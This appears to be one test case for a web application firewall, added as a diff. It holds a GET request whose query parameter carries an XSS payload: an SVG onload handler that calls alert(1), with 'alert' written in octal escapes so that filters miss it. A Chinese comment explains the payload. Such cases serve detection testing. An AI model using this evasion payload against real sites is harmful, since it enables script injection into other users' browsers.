@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_事件_编码类(ascii八进制编码)-06506581
+# 攻击载荷创建一个 SVG（可缩放矢量图形）元素，并在其 onload 事件中执行一段 JavaScript 代码。该 JavaScript 代码将调用一个名为 top 的全局对象的某个方法，并将数字 "1" 作为参数传递给该方法。
+GET /?id=%3Csvg%20onload=top%5B%27%5C141%5C154%5C145%5C162%5C164%27%5D%281%29%20%3E&bid=hd_tag_m8mv267r HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv267r
+RM-PRO-Token: 7676dd068d01c683bbb9bd53f3cb511b
+RM-PRO-Time: 1742808552285
+User-Agent: curl/7.83.1
+
